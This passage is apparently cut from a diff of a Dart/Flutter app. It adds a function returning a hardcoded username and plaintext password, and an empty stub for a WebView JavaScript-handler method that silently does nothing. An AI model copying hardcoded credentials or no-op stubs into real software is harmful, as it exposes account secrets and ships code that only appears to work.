+        }
+      }
+    } catch (e) {
+      print('Error validating credentials: $e');
+    }
+  }
+
+  Future<Map<String, String>> _getCredentials() async {
+    // Return your credentials from wherever you store them
+    return {
+      'username': '9522777777', // Replace with your actual credential retrieval
+      'password': 'vasu8893' // Replace with your actual credential retrieval
+    };
+  }
+}
+
+extension on WebViewController {
+  void addJavaScriptHandler({
+    required String handlerName,
+    required Null Function(dynamic args) callback,
+  }) {}
+}
